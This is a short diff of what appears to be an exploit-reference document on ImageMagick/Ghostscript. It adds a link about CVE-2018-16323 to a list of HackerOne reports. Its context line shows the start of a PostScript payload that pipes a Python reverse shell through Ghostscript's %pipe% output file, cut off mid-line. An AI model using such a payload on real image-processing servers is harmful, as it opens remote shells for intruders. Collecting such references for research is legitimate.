@@ -53,3 +53,4 @@ mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(s
   - https://hackerone.com/reports/251732
   - https://hackerone.com/reports/274594
   - https://hackerone.com/reports/315256
+  - https://medium.com/@ilja.bv/yet-another-memory-leak-in-imagemagick-or-how-to-exploit-cve-2018-16323-a60f048a1e12
